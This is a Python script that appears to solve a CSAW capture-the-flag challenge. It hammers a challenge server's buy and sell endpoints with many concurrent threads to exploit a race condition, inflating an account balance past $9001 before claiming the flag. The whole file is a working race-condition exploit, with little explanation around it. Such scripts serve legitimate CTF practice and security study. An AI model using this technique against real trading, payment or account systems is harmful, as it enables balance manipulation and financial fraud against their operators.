#!/usr/bin/env python3
import requests
import json
import uuid
import threading
import time
import concurrent.futures
import sys

# Challenge server URL
SERVER_URL = "http://android-dropper.csaw.io:4657"

# Create a unique user ID
user_id = str(uuid.uuid4())
print(f"[+] Created user ID: {user_id}")

# List of stocks to check
def get_stock_list():
    try:
        response = requests.get(f"{SERVER_URL}/listCalls")
        if response.status_code == 200:
            return json.loads(response.text)
        return {}
    except Exception as e:
        print(f"Error getting stock list: {e}")
        return {}

# Function to check account balance
def check_balance():
    try:
        response = requests.post(f"{SERVER_URL}/login", data={"key": user_id})
        if response.status_code == 200:
            return json.loads(response.text)
        return None
    except Exception as e:
        print(f"Error checking balance: {e}")
        return None

# Function to buy stock
def buy_stock(stock_name):
    try:
        response = requests.post(f"{SERVER_URL}/buy", data={"key": user_id, "stock": stock_name})
        return response.text
    except Exception as e:
        print(f"Error buying stock: {e}")
        return str(e)

# Function to sell stock
def sell_stock(stock_name):
    try:
        response = requests.post(f"{SERVER_URL}/sell", data={"key": user_id, "stock": stock_name})
        return response.text
    except Exception as e:
        print(f"Error selling stock: {e}")
        return str(e)

# Function to get the flag
def get_flag():
    try:
        response = requests.post(f"{SERVER_URL}/flag", data={"key": user_id})
        return response.text
    except Exception as e:
        print(f"Error getting flag: {e}")
        return str(e)

# Get list of available stocks
stocks = get_stock_list()
if stocks:
    print("[+] Available stocks:")
    # Find the most valuable stock
    highest_price = 0
    highest_stock = None
    for stock_id, stock_info in stocks.items():
        print(f"    {stock_info['name']} - ${stock_info['price']}")
        if stock_info['price'] > highest_price:
            highest_price = stock_info['price']
            highest_stock = stock_info['name']

    TARGET_STOCK = highest_stock
    TARGET_PRICE = highest_price
    print(f"[+] Targeting highest value stock: {TARGET_STOCK} (${TARGET_PRICE})")
else:
    # Default to known high-value stock
    TARGET_STOCK = "BURPSHARKHAT"
    print(f"[+] Using default target stock: {TARGET_STOCK}")

# Initial balance check
initial_status = check_balance()
if initial_status:
    print(f"[+] Initial account state: {initial_status}")
    initial_balance = initial_status.get('balance', 0)
    print(f"[+] Starting balance: ${initial_balance}")
else:
    print("[!] Failed to get initial balance")
    initial_balance = 0

# Function to perform buy-sell sequence to exploit race condition
def exploit_race_condition(i):
    # Buy the stock
    buy_result = buy_stock(TARGET_STOCK)
    # Immediately sell it
    sell_result = sell_stock(TARGET_STOCK)
    return (buy_result, sell_result)

# Main execution
def main():
    # We need to reach $9001 to get the flag
    target_balance = 9001

    # Track the number of exploitation attempts
    exploit_count = 0

    current_balance = initial_balance

    while current_balance < target_balance:
        exploit_count += 1
        print(f"[+] Exploitation attempt #{exploit_count}, current balance: ${current_balance}")

        # Create a larger thread pool to increase chances of race condition
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            # Submit multiple tasks at once to exploit the race condition
            futures = [executor.submit(exploit_race_condition, i) for i in range(30)]

            # Wait for all futures to complete
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    # Uncomment for detailed debugging
                    # print(f"Buy result: {result[0]}")
                    # print(f"Sell result: {result[1]}")
                except Exception as e:
                    print(f"Exception in thread: {e}")

        # Check the balance after each batch
        current_status = check_balance()
        if current_status:
            current_balance = current_status.get('balance', 0)
            stock_count = current_status.get(TARGET_STOCK, 0)
            print(f"[+] Current balance: ${current_balance}, {TARGET_STOCK} count: {stock_count}")

            # If we have some stocks but not enough money, try to sell them
            if stock_count > 0:
                print(f"[+] Selling {stock_count} shares of {TARGET_STOCK}")
                sell_result = sell_stock(TARGET_STOCK)
                print(f"Sell result: {sell_result}")
        else:
            print("[!] Failed to get current balance")

        # If we've reached the target balance, get the flag
        if current_balance >= target_balance:
            break

        # Sleep for a shorter time to be more aggressive
        print("[+] Waiting 5 seconds...")
        time.sleep(5)

    # Get the flag
    print("[+] Balance is sufficient! Getting the flag...")
    flag = get_flag()
    print(f"[+] Flag: {flag}")
    return flag

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

